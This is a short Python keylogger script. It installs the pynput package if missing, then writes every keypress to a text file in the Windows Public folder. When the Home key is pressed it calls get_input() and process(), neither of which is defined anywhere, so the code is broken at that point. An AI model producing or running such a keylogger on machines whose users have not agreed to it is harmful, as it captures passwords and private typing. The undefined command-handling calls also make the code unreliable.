import os

# Function to install required packages using pip
def install_packages():
    import subprocess
    subprocess.check_call(["python", "-m", "pip", "install", "pynput"])

# Check if pynput is installed
try:
    import pynput
except ImportError:
    print("pynput package is not installed. Installing...")
    install_packages()
    import pynput

from pynput.keyboard import Key, Listener

filepath = r"C:\Users\Public\keylog.txt"
if not os.path.exists(filepath):
    with open(filepath, 'w'):
            pass

# Function to handle key presses
def on_press(key):
    print(key)
    with open(filepath, "a") as f:
        f.write(str(key) + "\n")
    if str(key) == "Key.home":
        command = get_input()
        process(command)

# Create a listener that listens for key presses
with Listener(on_press=on_press) as listener:
    listener.join()
